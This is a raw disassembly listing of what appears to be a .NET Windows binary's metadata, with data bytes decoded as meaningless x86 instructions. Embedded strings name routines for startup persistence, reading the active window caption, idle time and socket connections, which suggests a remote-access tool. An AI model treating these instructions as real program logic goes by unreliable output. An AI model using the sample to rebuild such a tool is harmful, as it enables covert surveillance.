  408e7b:	00 03                	add    %al,(%ebx)
  408e7d:	00 11                	add    %dl,(%ecx)
  408e7f:	00 74 00 05          	add    %dh,0x5(%eax,%eax,1)
  408e83:	00 12                	add    %dl,(%edx)
  408e85:	00 76 00             	add    %dh,0x0(%esi)
  408e88:	03 00                	add    (%eax),%eax
  408e8a:	12 00                	adc    (%eax),%al
  408e8c:	78 00                	js     0x408e8e
  408e8e:	05 00 13 00 7a       	add    $0x7a001300,%eax
  408e93:	00 03                	add    %al,(%ebx)
  408e95:	00 13                	add    %dl,(%ebx)
  408e97:	00 7c 00 05          	add    %bh,0x5(%eax,%eax,1)
  408e9b:	00 14 00             	add    %dl,(%eax,%eax,1)
  408e9e:	7e 00                	jle    0x408ea0
  408ea0:	03 00                	add    (%eax),%eax
  408ea2:	14 00                	adc    $0x0,%al
  408ea4:	80 00 05             	addb   $0x5,(%eax)
  408ea7:	00 18                	add    %bl,(%eax)
  408ea9:	00 a2 00 03 00 18    	add    %ah,0x18000300(%edx)
  408eaf:	00 a4 00 05 00 19 00 	add    %ah,0x190005(%eax,%eax,1)
  408eb6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408eb7:	00 03                	add    %al,(%ebx)
  408eb9:	00 19                	add    %bl,(%ecx)
  408ebb:	00 a8 00 05 00 1a    	add    %ch,0x1a000500(%eax)
  408ec1:	00 aa 00 03 00 1a    	add    %ch,0x1a000300(%edx)
  408ec7:	00 ac 00 05 00 1b 00 	add    %ch,0x1b0005(%eax,%eax,1)
  408ece:	ae                   	scas   %es:(%edi),%al
  408ecf:	00 03                	add    %al,(%ebx)
  408ed1:	00 1b                	add    %bl,(%ebx)
  408ed3:	00 b0 00 05 00 1d    	add    %dh,0x1d000500(%eax)
  408ed9:	00 be 00 03 00 1d    	add    %bh,0x1d000300(%esi)
  408edf:	00 c0                	add    %al,%al
  408ee1:	00 05 00 24 00 0a    	add    %al,0xa002400
  408ee7:	01 03                	add    %eax,(%ebx)
  408ee9:	00 24 00             	add    %ah,(%eax,%eax,1)
  408eec:	0c 01                	or     $0x1,%al
  408eee:	05 00 25 00 0e       	add    $0xe002500,%eax
  408ef3:	01 03                	add    %eax,(%ebx)
  408ef5:	00 25 00 10 01 05    	add    %ah,0x5011000
  408efb:	00 26                	add    %ah,(%esi)
  408efd:	00 12                	add    %dl,(%edx)
  408eff:	01 03                	add    %eax,(%ebx)
  408f01:	00 26                	add    %ah,(%esi)
  408f03:	00 14 01             	add    %dl,(%ecx,%eax,1)
  408f06:	05 00 27 00 16       	add    $0x16002700,%eax
  408f0b:	01 03                	add    %eax,(%ebx)
  408f0d:	00 27                	add    %ah,(%edi)
  408f0f:	00 18                	add    %bl,(%eax)
  408f11:	01 05 00 28 00 1a    	add    %eax,0x1a002800
  408f17:	01 03                	add    %eax,(%ebx)
  408f19:	00 28                	add    %ch,(%eax)
  408f1b:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408f1e:	05 00 29 00 1e       	add    $0x1e002900,%eax
  408f23:	01 03                	add    %eax,(%ebx)
  408f25:	00 29                	add    %ch,(%ecx)
  408f27:	00 20                	add    %ah,(%eax)
  408f29:	01 05 00 2a 00 22    	add    %eax,0x22002a00
  408f2f:	01 03                	add    %eax,(%ebx)
  408f31:	00 2a                	add    %ch,(%edx)
  408f33:	00 24 01             	add    %ah,(%ecx,%eax,1)
  408f36:	05 00 55 0f 26       	add    $0x260f5500,%eax
  408f3b:	0f 5f 0f             	maxps  (%edi),%xmm1
  408f3e:	33 0f                	xor    (%edi),%ecx
  408f40:	4a                   	dec    %edx
  408f41:	0f 3f                	(bad)
  408f43:	0f 23 09             	mov    %ecx,%db1
  408f46:	7d 09                	jge    0x408f51
  408f48:	8d 09                	lea    (%ecx),%ecx
  408f4a:	c5 09                	lds    (%ecx),%ecx
  408f4c:	cb                   	lret
  408f4d:	09 da                	or     %ebx,%edx
  408f4f:	0a e1                	or     %cl,%ah
  408f51:	0a e8                	or     %al,%ch
  408f53:	0a a7 0b ad 0b bd    	or     -0x42f452f5(%edi),%ah
  408f59:	0b c3                	or     %ebx,%eax
  408f5b:	0b 76 0c             	or     0xc(%esi),%esi
  408f5e:	97                   	xchg   %eax,%edi
  408f5f:	0c be                	or     $0xbe,%al
  408f61:	0c cf                	or     $0xcf,%al
  408f63:	0c 9f                	or     $0x9f,%al
  408f65:	0d b4 0d 04 0e       	or     $0xe040db4,%eax
  408f6a:	55                   	push   %ebp
  408f6b:	0e                   	push   %cs
  408f6c:	5c                   	pop    %esp
  408f6d:	0e                   	push   %cs
  408f6e:	f8                   	clc
  408f6f:	0e                   	push   %cs
  408f70:	1b 0f                	sbb    (%edi),%ecx
  408f72:	21 0f                	and    %ecx,(%edi)
  408f74:	39 10                	cmp    %edx,(%eax)
  408f76:	6f                   	outsl  %ds:(%esi),(%dx)
  408f77:	10 0e                	adc    %cl,(%esi)
  408f79:	11 c1                	adc    %eax,%ecx
  408f7b:	11 06                	adc    %eax,(%esi)
  408f7d:	12 23                	adc    (%ebx),%ah
  408f7f:	12 00                	adc    (%eax),%al
  408f81:	01 03                	add    %eax,(%ebx)
  408f83:	00 e3                	add    %ah,%bl
  408f85:	0c 01                	or     $0x1,%al
  408f87:	00 00                	add    %al,(%eax)
  408f89:	01 05 00 55 13 01    	add    %eax,0x1135500
  408f8f:	00 00                	add    %al,(%eax)
  408f91:	01 07                	add    %eax,(%edi)
  408f93:	00 43 13             	add    %al,0x13(%ebx)
  408f96:	01 00                	add    %eax,(%eax)
  408f98:	46                   	inc    %esi
  408f99:	01 09                	add    %ecx,(%ecx)
  408f9b:	00 2c 07             	add    %ch,(%edi,%eax,1)
  408f9e:	02 00                	add    (%eax),%al
  408fa0:	40                   	inc    %eax
  408fa1:	01 0b                	add    %ecx,(%ebx)
  408fa3:	00 36                	add    %dh,(%esi)
  408fa5:	08 02                	or     %al,(%edx)
  408fa7:	00 00                	add    %al,(%eax)
  408fa9:	02 57 00             	add    0x0(%edi),%dl
  408fac:	f4                   	hlt
  408fad:	11 03                	adc    %eax,(%ebx)
  408faf:	00 40 01             	add    %al,0x1(%eax)
  408fb2:	cf                   	iret
  408fb3:	00 31                	add    %dh,(%ecx)
  408fb5:	10 04 00             	adc    %al,(%eax,%eax,1)
  408fb8:	46                   	inc    %esi
  408fb9:	01 d1                	add    %edx,%ecx
  408fbb:	00 aa 19 05 00 46    	add    %ch,0x46000519(%edx)
  408fc1:	01 d3                	add    %edx,%ebx
  408fc3:	00 78 19             	add    %bh,0x19(%eax)
  408fc6:	05 00 46 01 d5       	add    $0xd5014600,%eax
  408fcb:	00 90 0e 05 00 00    	add    %dl,0x50e(%eax)
  408fd1:	01 d7                	add    %edx,%edi
  408fd3:	00 37                	add    %dh,(%edi)
  408fd5:	07                   	pop    %es
  408fd6:	05 00 00 01 d9       	add    $0xd9010000,%eax
  408fdb:	00 c1                	add    %al,%cl
  408fdd:	11 06                	adc    %eax,(%esi)
  408fdf:	00 00                	add    %al,(%eax)
  408fe1:	01 db                	add    %ebx,%ebx
  408fe3:	00 8b 08 05 00 50    	add    %cl,0x50000508(%ebx)
  408fe9:	20 00                	and    %al,(%eax)
  408feb:	00 cf                	add    %cl,%bh
  408fed:	00 58 20             	add    %bl,0x20(%eax)
  408ff0:	00 00                	add    %al,(%eax)
  408ff2:	d0 00                	rolb   $1,(%eax)
  408ff4:	04 80                	add    $0x80,%al
  408ff6:	00 00                	add    %al,(%eax)
  408ff8:	01 00                	add    %eax,(%eax)
	...
  409006:	c2 17 00             	ret    $0x17
  409009:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  409014:	00 00                	add    %al,(%eax)
  409016:	01 00                	add    %eax,(%eax)
  409018:	6c                   	insb   (%dx),%es:(%edi)
  409019:	06                   	push   %es
  40901a:	00 00                	add    %al,(%eax)
  40901c:	00 00                	add    %al,(%eax)
  40901e:	04 00                	add    $0x0,%al
	...
  409028:	00 00                	add    %al,(%eax)
  40902a:	01 00                	add    %eax,(%eax)
  40902c:	b1 0f                	mov    $0xf,%cl
  40902e:	00 00                	add    %al,(%eax)
  409030:	00 00                	add    %al,(%eax)
  409032:	04 00                	add    $0x0,%al
	...
  40903c:	00 00                	add    %al,(%eax)
  40903e:	01 00                	add    %eax,(%eax)
  409040:	f6 09 00             	testb  $0x0,(%ecx)
  409043:	00 00                	add    %al,(%eax)
  409045:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  409050:	00 00                	add    %al,(%eax)
  409052:	56                   	push   %esi
  409053:	10 e2                	adc    %ah,%dl
  409055:	17                   	pop    %ss
  409056:	00 00                	add    %al,(%eax)
  409058:	00 00                	add    %al,(%eax)
  40905a:	04 00                	add    $0x0,%al
  40905c:	03 00                	add    (%eax),%eax
  40905e:	07                   	pop    %es
  40905f:	00 06                	add    %al,(%esi)
  409061:	00 08                	add    %cl,(%eax)
  409063:	00 06                	add    %al,(%esi)
  409065:	00 09                	add    %cl,(%ecx)
  409067:	00 06                	add    %al,(%esi)
  409069:	00 0a                	add    %cl,(%edx)
  40906b:	00 06                	add    %al,(%esi)
  40906d:	00 0b                	add    %cl,(%ebx)
  40906f:	00 06                	add    %al,(%esi)
  409071:	00 0c 00             	add    %cl,(%eax,%eax,1)
  409074:	06                   	push   %es
  409075:	00 0d 00 06 00 0e    	add    %cl,0xe000600
  40907b:	00 06                	add    %al,(%esi)
  40907d:	00 10                	add    %dl,(%eax)
  40907f:	00 0f                	add    %cl,(%edi)
  409081:	00 11                	add    %dl,(%ecx)
  409083:	00 0f                	add    %cl,(%edi)
  409085:	00 12                	add    %dl,(%edx)
  409087:	00 0f                	add    %cl,(%edi)
  409089:	00 13                	add    %dl,(%ebx)
  40908b:	00 0f                	add    %cl,(%edi)
  40908d:	00 14 00             	add    %dl,(%eax,%eax,1)
  409090:	0f 00 17             	lldt   (%edi)
  409093:	00 16                	add    %dl,(%esi)
  409095:	00 18                	add    %bl,(%eax)
  409097:	00 16                	add    %dl,(%esi)
  409099:	00 19                	add    %bl,(%ecx)
  40909b:	00 16                	add    %dl,(%esi)
  40909d:	00 1a                	add    %bl,(%edx)
  40909f:	00 16                	add    %dl,(%esi)
  4090a1:	00 1b                	add    %bl,(%ebx)
  4090a3:	00 16                	add    %dl,(%esi)
  4090a5:	00 1d 00 1c 00 20    	add    %bl,0x20001c00
  4090ab:	00 1f                	add    %bl,(%edi)
  4090ad:	00 21                	add    %ah,(%ecx)
  4090af:	00 1f                	add    %bl,(%edi)
  4090b1:	00 22                	add    %ah,(%edx)
  4090b3:	00 1f                	add    %bl,(%edi)
  4090b5:	00 23                	add    %ah,(%ebx)
  4090b7:	00 1f                	add    %bl,(%edi)
  4090b9:	00 24 00             	add    %ah,(%eax,%eax,1)
  4090bc:	1f                   	pop    %ds
  4090bd:	00 25 00 1f 00 26    	add    %ah,0x26001f00
  4090c3:	00 1f                	add    %bl,(%edi)
  4090c5:	00 27                	add    %ah,(%edi)
  4090c7:	00 1f                	add    %bl,(%edi)
  4090c9:	00 28                	add    %ch,(%eax)
  4090cb:	00 1f                	add    %bl,(%edi)
  4090cd:	00 29                	add    %ch,(%ecx)
  4090cf:	00 1f                	add    %bl,(%edi)
  4090d1:	00 2a                	add    %ch,(%edx)
  4090d3:	00 1f                	add    %bl,(%edi)
  4090d5:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4090d8:	2b 00                	sub    (%eax),%eax
  4090da:	2d 00 2b 00 2b       	sub    $0x2b002b00,%eax
  4090df:	00 19                	add    %bl,(%ecx)
  4090e1:	09 39                	or     %edi,(%ecx)
  4090e3:	00 50 09             	add    %dl,0x9(%eax)
  4090e6:	4b                   	dec    %ebx
  4090e7:	00 9f 09 4b 00 d1    	add    %bl,-0x2effb4f7(%edi)
  4090ed:	09 4b 00             	or     %ecx,0x0(%ebx)
  4090f0:	20 0a                	and    %cl,(%edx)
  4090f2:	39 00                	cmp    %eax,(%eax)
  4090f4:	7b 0a                	jnp    0x409100
  4090f6:	39 00                	cmp    %eax,(%eax)
  4090f8:	85 0a                	test   %ecx,(%edx)
  4090fa:	39 00                	cmp    %eax,(%eax)
  4090fc:	8f 0a 39 00          	(bad)
  409100:	99                   	cltd
  409101:	0a 39                	or     (%ecx),%bh
  409103:	00 a3 0a 39 00 ad    	add    %ah,-0x52ffc6f6(%ebx)
  409109:	0a 39                	or     (%ecx),%bh
  40910b:	00 b7 0a 39 00 c1    	add    %dh,-0x3effc6f6(%edi)
  409111:	0a 4b 00             	or     0x0(%ebx),%cl
  409114:	ef                   	out    %eax,(%dx)
  409115:	0a 4b 00             	or     0x0(%ebx),%cl
  409118:	fa                   	cli
  409119:	0a 4b 00             	or     0x0(%ebx),%cl
  40911c:	2d 0b ab 00 19       	sub    $0x1900ab0b,%eax
  409121:	09 ad 00 19 09 af    	or     %ebp,-0x50f6e700(%ebp)
  409127:	00 62 0b             	add    %ah,0xb(%edx)
  40912a:	4b                   	dec    %ebx
  40912b:	00 82 0b 4b 00 b3    	add    %al,-0x4cffb4f5(%edx)
  409131:	0b 4b 00             	or     0x0(%ebx),%ecx
  409134:	c9                   	leave
  409135:	0b 4b 00             	or     0x0(%ebx),%ecx
  409138:	da 0b                	fimull (%ebx)
  40913a:	4b                   	dec    %ebx
  40913b:	00 f7                	add    %dh,%bh
  40913d:	0b 4b 00             	or     0x0(%ebx),%ecx
  409140:	02 0c 4b             	add    (%ebx,%ecx,2),%cl
  409143:	00 31                	add    %dh,(%ecx)
  409145:	0c 4b                	or     $0x4b,%al
  409147:	00 38                	add    %bh,(%eax)
  409149:	0c 4b                	or     $0x4b,%al
  40914b:	00 43 0c             	add    %al,0xc(%ebx)
  40914e:	4b                   	dec    %ebx
  40914f:	00 4d 0c             	add    %cl,0xc(%ebp)
  409152:	4b                   	dec    %ebx
  409153:	00 58 0c             	add    %bl,0xc(%eax)
  409156:	4b                   	dec    %ebx
  409157:	00 6c 0c df          	add    %ch,-0x21(%esp,%ecx,1)
  40915b:	00 8d 0c e3 00 a7    	add    %cl,-0x58ff1cf4(%ebp)
  409161:	0c eb                	or     $0xeb,%al
  409163:	00 c5                	add    %al,%ch
  409165:	0c f1                	or     $0xf1,%al
  409167:	00 d5                	add    %dl,%ch
  409169:	0c f1                	or     $0xf1,%al
  40916b:	00 df                	add    %bl,%bh
  40916d:	0c f7                	or     $0xf7,%al
  40916f:	00 09                	add    %cl,(%ecx)
  409171:	0d f7 00 14 0d       	or     $0xd1400f7,%eax
  409176:	05 01 5b 0d 05       	add    $0x50d5b01,%eax
  40917b:	01 62 0d             	add    %esp,0xd(%edx)
  40917e:	05 01 6d 0d 17       	add    $0x170d6d01,%eax
  409183:	01 da                	add    %ebx,%edx
  409185:	0d 19 01 de 0d       	or     $0xdde0119,%eax
  40918a:	1f                   	pop    %ds
  40918b:	01 f5                	add    %esi,%ebp
  40918d:	0d 31 01 1e 0e       	or     $0xe1e0131,%eax
  409192:	f7 00 37 0e eb 00    	testl  $0xeb0e37,(%eax)
  409198:	46                   	inc    %esi
  409199:	0e                   	push   %cs
  40919a:	eb 00                	jmp    0x40919c
  40919c:	50                   	push   %eax
  40919d:	0e                   	push   %cs
  40919e:	41                   	inc    %ecx
  40919f:	01 84 0e f1 00 a6 0e 	add    %eax,0xea600f1(%esi,%ecx,1)
  4091a6:	eb 00                	jmp    0x4091a8
  4091a8:	b0 0e                	mov    $0xe,%al
  4091aa:	31 01                	xor    %eax,(%ecx)
  4091ac:	cc                   	int3
  4091ad:	0e                   	push   %cs
  4091ae:	31 01                	xor    %eax,(%ecx)
  4091b0:	27                   	daa
  4091b1:	0f 31                	rdtsc
  4091b3:	01 46 0f             	add    %eax,0xf(%esi)
  4091b6:	31 01                	xor    %eax,(%ecx)
  4091b8:	5d                   	pop    %ebp
  4091b9:	0f                   	maskmovq (bad),%mm0
  4091ba:	f7 00 83 0f 39 00    	testl  $0x390f83,(%eax)
  4091c0:	97                   	xchg   %eax,%edi
  4091c1:	0f 4b 00             	cmovnp (%eax),%eax
  4091c4:	fd                   	std
  4091c5:	0f 4b 00             	cmovnp (%eax),%eax
  4091c8:	04 10                	add    $0x10,%al
  4091ca:	4b                   	dec    %ebx
  4091cb:	00 17                	add    %dl,(%edi)
  4091cd:	10 9d 01 3f 10 e3    	adc    %bl,-0x1cefc0ff(%ebp)
  4091d3:	00 d2                	add    %dl,%dl
  4091d5:	10 39                	adc    %bh,(%ecx)
  4091d7:	00 de                	add    %bl,%dh
  4091d9:	10 39                	adc    %bh,(%ecx)
  4091db:	00 ea                	add    %ch,%dl
  4091dd:	10 f1                	adc    %dh,%cl
  4091df:	00 f6                	add    %dh,%dh
  4091e1:	10 f1                	adc    %dh,%cl
  4091e3:	00 02                	add    %al,(%edx)
  4091e5:	11 e7                	adc    %esp,%edi
  4091e7:	01 14 11             	add    %edx,(%ecx,%edx,1)
  4091ea:	eb 01                	jmp    0x4091ed
  4091ec:	27                   	daa
  4091ed:	11 1f                	adc    %ebx,(%edi)
  4091ef:	01 62 0b             	add    %esp,0xb(%edx)
  4091f2:	f7 00 a8 11 27 02    	testl  $0x22711a8,(%eax)
  4091f8:	da 0d f7 00 d7 11    	fimull 0x11d700f7
  4091fe:	05 01 ef 11 27       	add    $0x2711ef01,%eax
  409203:	02 62 0b             	add    0xb(%edx),%ah
  409206:	2b 02                	sub    (%edx),%eax
  409208:	0c 12                	or     $0x12,%al
  40920a:	27                   	daa
  40920b:	02 29                	add    (%ecx),%ch
  40920d:	12 35 02 2d 12 4b    	adc    0x4b122d02,%dh
  409213:	00 48 12             	add    %cl,0x12(%eax)
  409216:	4b                   	dec    %ebx
  409217:	00 50 12             	add    %dl,0x12(%eax)
  40921a:	00 00                	add    %al,(%eax)
  40921c:	00 3c 52             	add    %bh,(%edx,%edx,2)
  40921f:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409223:	76 65                	jbe    0x40928a
  409225:	41                   	inc    %ecx
  409226:	73 79                	jae    0x4092a1
  409228:	6e                   	outsb  %ds:(%esi),(%dx)
  409229:	63 3e                	arpl   %edi,(%esi)
  40922b:	64 5f                	fs pop %edi
  40922d:	5f                   	pop    %edi
  40922e:	31 30                	xor    %esi,(%eax)
  409230:	00 3c 44             	add    %bh,(%esp,%eax,2)
  409233:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40923a:	63 74 3e 64          	arpl   %esi,0x64(%esi,%edi,1)
  40923e:	5f                   	pop    %edi
  40923f:	5f                   	pop    %edi
  409240:	31 30                	xor    %esi,(%eax)
  409242:	00 3c 44             	add    %bh,(%esp,%eax,2)
  409245:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409249:	4d                   	dec    %ebp
  40924a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40924c:	75 3e                	jne    0x40928c
  40924e:	64 5f                	fs pop %edi
  409250:	5f                   	pop    %edi
  409251:	31 30                	xor    %esi,(%eax)
  409253:	00 3c 47             	add    %bh,(%edi,%eax,2)
  409256:	65 74 49             	gs je  0x4092a2
  409259:	64 6c                	fs insb (%dx),%es:(%edi)
  40925b:	65 54                	gs push %esp
  40925d:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  409264:	63 3e                	arpl   %edi,(%esi)
  409266:	64 5f                	fs pop %edi
  409268:	5f                   	pop    %edi
  409269:	32 30                	xor    (%eax),%dh
  40926b:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40926e:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  409271:	32 30                	xor    (%eax),%dh
  409273:	5f                   	pop    %edi
  409274:	30 00                	xor    %al,(%eax)
  409276:	3c 47                	cmp    $0x47,%al
  409278:	65 74 49             	gs je  0x4092c4
  40927b:	64 6c                	fs insb (%dx),%es:(%edi)
  40927d:	65 54                	gs push %esp
  40927f:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  409286:	63 3e                	arpl   %edi,(%esi)
  409288:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40928b:	32 30                	xor    (%eax),%dh
  40928d:	5f                   	pop    %edi
  40928e:	30 00                	xor    %al,(%eax)
  409290:	3c 3e                	cmp    $0x3e,%al
  409292:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  409295:	44                   	inc    %esp
  409296:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40929d:	6c                   	insb   (%dx),%es:(%edi)
  40929e:	61                   	popa
  40929f:	73 73                	jae    0x409314
  4092a1:	31 36                	xor    %esi,(%esi)
  4092a3:	5f                   	pop    %edi
  4092a4:	30 00                	xor    %al,(%eax)
  4092a6:	3c 3e                	cmp    $0x3e,%al
  4092a8:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  4092ab:	36 5f                	ss pop %edi
  4092ad:	30 00                	xor    %al,(%eax)
  4092af:	3c 43                	cmp    $0x43,%al
  4092b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4092b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b3:	63 61 74             	arpl   %esp,0x74(%ecx)
  4092b6:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4092ba:	36 5f                	ss pop %edi
  4092bc:	30 00                	xor    %al,(%eax)
  4092be:	3c 3e                	cmp    $0x3e,%al
  4092c0:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4092c3:	44                   	inc    %esp
  4092c4:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4092cb:	6c                   	insb   (%dx),%es:(%edi)
  4092cc:	61                   	popa
  4092cd:	73 73                	jae    0x409342
  4092cf:	31 38                	xor    %edi,(%eax)
  4092d1:	5f                   	pop    %edi
  4092d2:	30 00                	xor    %al,(%eax)
  4092d4:	3c 3e                	cmp    $0x3e,%al
  4092d6:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  4092d9:	38 5f 30             	cmp    %bl,0x30(%edi)
  4092dc:	00 3c 47             	add    %bh,(%edi,%eax,2)
  4092df:	65 74 43             	gs je  0x409325
  4092e2:	61                   	popa
  4092e3:	70 74                	jo     0x409359
  4092e5:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  4092ec:	74 69                	je     0x409357
  4092ee:	76 65                	jbe    0x409355
  4092f0:	57                   	push   %edi
  4092f1:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  4092f8:	79 6e                	jns    0x409368
  4092fa:	63 3e                	arpl   %edi,(%esi)
  4092fc:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4092ff:	38 5f 30             	cmp    %bl,0x30(%edi)
  409302:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  409305:	64 64 54             	fs fs push %esp
  409308:	6f                   	outsl  %ds:(%esi),(%dx)
  409309:	53                   	push   %ebx
  40930a:	74 61                	je     0x40936d
  40930c:	72 74                	jb     0x409382
  40930e:	75 70                	jne    0x409380
  409310:	4e                   	dec    %esi
  409311:	6f                   	outsl  %ds:(%esi),(%dx)
  409312:	6e                   	outsb  %ds:(%esi),(%dx)
  409313:	41                   	inc    %ecx
  409314:	64 6d                	fs insl (%dx),%es:(%edi)
  409316:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  40931d:	00 3c 52             	add    %bh,(%edx,%edx,2)
  409320:	65 6d                	gs insl (%dx),%es:(%edi)
  409322:	6f                   	outsl  %ds:(%esi),(%dx)
  409323:	76 65                	jbe    0x40938a
  409325:	53                   	push   %ebx
  409326:	74 61                	je     0x409389
  409328:	72 74                	jb     0x40939e
  40932a:	75 70                	jne    0x40939c
  40932c:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  409330:	30 00                	xor    %al,(%eax)
  409332:	54                   	push   %esp
  409333:	79 70                	jns    0x4093a5
  409335:	65 30 00             	xor    %al,%gs:(%eax)
  409338:	3c 43                	cmp    $0x43,%al
  40933a:	6f                   	outsl  %ds:(%esi),(%dx)
  40933b:	6e                   	outsb  %ds:(%esi),(%dx)
  40933c:	6e                   	outsb  %ds:(%esi),(%dx)
  40933d:	65 63 74 53 75       	arpl   %esi,%gs:0x75(%ebx,%edx,2)
  409342:	62 53 6f             	bound  %edx,0x6f(%ebx)
  409345:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409348:	73 79                	jae    0x4093c3
  40934a:	6e                   	outsb  %ds:(%esi),(%dx)
  40934b:	63 3e                	arpl   %edi,(%esi)
  40934d:	64 5f                	fs pop %edi
  40934f:	5f                   	pop    %edi
  409350:	31 31                	xor    %esi,(%ecx)
  409352:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  409359:	64 5f                	fs pop %edi
  40935b:	5f                   	pop    %edi
  40935c:	31 31                	xor    %esi,(%ecx)
  40935e:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  409361:	65 6e                	outsb  %gs:(%esi),(%dx)
  409363:	64 55                	fs push %ebp
  409365:	70 64                	jo     0x4093cb
  409367:	61                   	popa
  409368:	74 65                	je     0x4093cf
  40936a:	49                   	dec    %ecx
  40936b:	6e                   	outsb  %ds:(%esi),(%dx)
  40936c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40936e:	3e 64 5f             	ds fs pop %edi
  409371:	5f                   	pop    %edi
  409372:	31 31                	xor    %esi,(%ecx)
  409374:	00 43 4f             	add    %al,0x4f(%ebx)
  409377:	4d                   	dec    %ebp
  409378:	50                   	push   %eax
  409379:	52                   	push   %edx
  40937a:	45                   	inc    %ebp
  40937b:	53                   	push   %ebx
  40937c:	53                   	push   %ebx
  40937d:	49                   	dec    %ecx
  40937e:	4f                   	dec    %edi
  40937f:	4e                   	dec    %esi
  409380:	5f                   	pop    %edi
  409381:	46                   	inc    %esi
  409382:	4f                   	dec    %edi
  409383:	52                   	push   %edx
  409384:	4d                   	dec    %ebp
  409385:	41                   	inc    %ecx
  409386:	54                   	push   %esp
  409387:	5f                   	pop    %edi
  409388:	4c                   	dec    %esp
  409389:	5a                   	pop    %edx
  40938a:	4e                   	dec    %esi
  40938b:	54                   	push   %esp
  40938c:	31 00                	xor    %eax,(%eax)
  40938e:	3c 3e                	cmp    $0x3e,%al
  409390:	75 5f                	jne    0x4093f1
  409392:	5f                   	pop    %edi
  409393:	31 00                	xor    %eax,(%eax)
  409395:	46                   	inc    %esi
  409396:	75 6e                	jne    0x409406
  409398:	63 60 31             	arpl   %esp,0x31(%eax)
  40939b:	00 49 45             	add    %cl,0x45(%ecx)
  40939e:	6e                   	outsb  %ds:(%esi),(%dx)
  40939f:	75 6d                	jne    0x40940e
  4093a1:	65 72 61             	gs jb  0x409405
  4093a4:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4093a8:	31 00                	xor    %eax,(%eax)
  4093aa:	54                   	push   %esp
  4093ab:	61                   	popa
  4093ac:	73 6b                	jae    0x409419
  4093ae:	60                   	pusha
  4093af:	31 00                	xor    %eax,(%eax)
  4093b1:	41                   	inc    %ecx
  4093b2:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  4093b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b7:	60                   	pusha
  4093b8:	31 00                	xor    %eax,(%eax)
  4093ba:	41                   	inc    %ecx
  4093bb:	73 79                	jae    0x409436
  4093bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4093be:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  4093c2:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  4093c6:	68 6f 64 42 75       	push   $0x7542646f
  4093cb:	69 6c 64 65 72 60 31 	imul   $0x316072,0x65(%esp,%eiz,2),%ebp
  4093d2:	00 
  4093d3:	54                   	push   %esp
  4093d4:	61                   	popa
  4093d5:	73 6b                	jae    0x409442
  4093d7:	41                   	inc    %ecx
  4093d8:	77 61                	ja     0x40943b
  4093da:	69 74 65 72 60 31 00 	imul   $0x41003160,0x72(%ebp,%eiz,2),%esi
  4093e1:	41 
  4093e2:	72 72                	jb     0x409456
  4093e4:	61                   	popa
  4093e5:	79 53                	jns    0x40943a
  4093e7:	65 67 6d             	gs insl (%dx),%es:(%di)
  4093ea:	65 6e                	outsb  %gs:(%esi),(%dx)
  4093ec:	74 60                	je     0x40944e
  4093ee:	31 00                	xor    %eax,(%eax)
  4093f0:	4c                   	dec    %esp
  4093f1:	69 73 74 60 31 00 62 	imul   $0x62003160,0x74(%ebx),%esi
  4093f8:	31 00                	xor    %eax,(%eax)
  4093fa:	3c 3e                	cmp    $0x3e,%al
  4093fc:	37                   	aaa
  4093fd:	5f                   	pop    %edi
  4093fe:	5f                   	pop    %edi
  4093ff:	77 72                	ja     0x409473
  409401:	61                   	popa
  409402:	70 31                	jo     0x409435
  409404:	00 5f 5f             	add    %bl,0x5f(%edi)
  409407:	53                   	push   %ebx
  409408:	74 61                	je     0x40946b
  40940a:	74 69                	je     0x409475
  40940c:	63 41 72             	arpl   %eax,0x72(%ecx)
  40940f:	72 61                	jb     0x409472
  409411:	79 49                	jns    0x40945c
  409413:	6e                   	outsb  %ds:(%esi),(%dx)
  409414:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40941b:	69 
  40941c:	7a 65                	jp     0x409483
  40941e:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  409423:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40942a:	74 2e                	je     0x40945a
  40942c:	57                   	push   %edi
  40942d:	69 6e 33 32 00 55 49 	imul   $0x49550032,0x33(%esi),%ebp
